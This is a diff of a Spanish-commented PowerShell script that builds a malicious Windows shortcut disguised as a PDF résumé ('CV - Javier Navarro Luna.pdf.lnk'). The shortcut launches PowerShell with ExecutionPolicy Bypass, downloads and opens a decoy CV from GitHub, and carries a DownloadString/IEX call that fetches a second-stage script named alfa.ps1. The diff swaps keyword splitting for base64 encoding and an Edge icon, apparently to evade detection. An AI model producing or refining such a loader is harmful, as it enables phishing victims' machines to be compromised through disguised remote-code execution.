@@ -1,23 +1,20 @@
 $WshShell = New-Object -ComObject WScript.Shell
+if ($null -eq $WshShell) { Write-Error "WshShell es NULL"; return }
 
 $Shortcut = $WshShell.CreateShortcut("$pwd\CV - Javier Navarro Luna.pdf.lnk")
+if ($null -eq $Shortcut) { Write-Error "Shortcut es NULL"; return }
 
-# Construir las palabras clave por partes (no aparecen completas en el .ps1)
-$dl = "Down" + "load" + "File"
-$ds = "Down" + "load" + "String"
-$iex = "I" + "EX"
+$command = @"
+(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/CV.pdf', '.\CV - Javier Navarro Luna.pdf');
+Start-Process ".\CV - Javier Navarro Luna.pdf";
+echo I E X (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1')
+"@
 
-$url1 = "https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/CV.pdf"
-$url2 = "https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1"
-$pdf = "CV - Javier Navarro Luna.pdf"
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
+if ($null -eq $encoded) { Write-Error "Encoded es NULL"; return }
 
 $Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
-$Shortcut.Arguments = "/C powershell.exe -nop -ExecutionPolicy Bypass -c `"(New-Object Net.WebClient).$dl('$url1', '.\$pdf')`" & cmd.exe /c start `"`" `"$pdf`" & echo powershell.exe -nop -ExecutionPolicy Bypass -c `"$iex (New-Object Net.WebClient).$ds('$url2')`""
-
-$progId = (Get-Item "HKCR:\.pdf" -ErrorAction SilentlyContinue)."(Default)"
-$pdfIcon = (Get-ItemProperty "HKCR:\$progId\DefaultIcon" -ErrorAction SilentlyContinue)."(Default)"
-if (-not $pdfIcon) { $pdfIcon = "C:\Windows\System32\shell32.dll,75" }
-$Shortcut.IconLocation = $pdfIcon
-
+$Shortcut.Arguments = "/C powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
+$Shortcut.IconLocation = "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe,11"
 $Shortcut.Save()
 
